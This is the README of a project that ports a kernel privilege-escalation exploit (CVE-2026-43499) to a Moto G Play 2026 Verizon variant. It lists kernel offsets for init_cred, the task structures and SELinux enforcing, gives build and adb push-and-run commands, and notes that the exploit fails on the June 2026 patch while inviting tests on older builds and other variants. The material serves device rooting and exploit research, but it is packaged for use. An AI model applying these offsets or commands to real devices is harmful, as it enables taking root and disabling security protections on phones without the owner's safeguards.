# GhostLock-Nevada

GhostLock (CVE-2026-43499) port for the **Moto G Play 2026 (XT2615-1)** – **TracFone/Verizon variant**.

---

## ⚠️ Status

**The exploit currently fails** on the **June 2026 security patch** – it stops at the KASLR leak stage with:

```
[-] prepare_kernel_page did not find usable nonzero source pointers
```

It does **not** crash the device – it simply fails cleanly.

This is likely because **Motorola/Verizon patched CVE-2026-43499** in the June update.

It may still work on **older builds** or **non-Verizon variants** – please test and report back.

---

## 🔍 Offsets Extracted

Kernel: `5.15.189-android13-8-00018-g9c82b71884fd-ab14885418`  
Build: `W1WNS36.18-111-3`

```c
#define KIMAGE_TEXT_BASE             0xffffffc008000000ULL
#define INIT_TASK_OFF                0x0000000002c43400ULL
#define INIT_CRED_OFF                0x0000000002bfd588ULL
#define ENTRY_TASK_OFF               0x0000000002ac82e8ULL
#define PER_CPU_OFFSET_OFF           0x0000000002b0cd58ULL
#define ROOT_TASK_GROUP_OFF          0x0000000002d58ac0ULL
#define SELINUX_ENFORCING_OFF        0x0000000002b4404ULL
```

Memory layout: **39-bit MTK** (`PAGE_OFFSET = 0xffffffc000000000`)

---

## 📥 Build Instructions (Ubuntu/Linux)

### Prerequisites
- Android NDK r29 (or later)
- `adb` and `fastboot`

```bash
# Clone the repo
git clone https://github.com/YOUR_USERNAME/GhostLock-Nevada.git
cd GhostLock-Nevada

# Set NDK path
export ANDROID_NDK_ROOT=~/android-ndk-r29

# Compile
make
```

### Push and Run
```bash
# Standalone binary
adb push build/ghostlock-nevada /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock-nevada
adb shell /data/local/tmp/ghostlock-nevada

# LD_PRELOAD method
adb push build/ghostlock-nevada.so /data/local/tmp/
adb shell chmod 755 /data/local/tmp/ghostlock-nevada.so
adb shell LD_PRELOAD=/data/local/tmp/ghostlock-nevada.so id
```

---

## 🗂️ Files Included

- `src/` – exploit source code
- `target.h` – device-specific offsets (already filled)
- `Makefile` – builds the binary and .so
- `README.md` – this file

---

## 🧪 Testing on Other Variants

If you have a different **Moto G Play 2026** variant (RETUS, LATAM, etc.), please test and share your results.  
You'll need to extract your own `boot.img` and symbols – but the offsets above may serve as a starting point.

---

## 📄 License

This project is for **educational and research purposes only**. Use at your own risk.
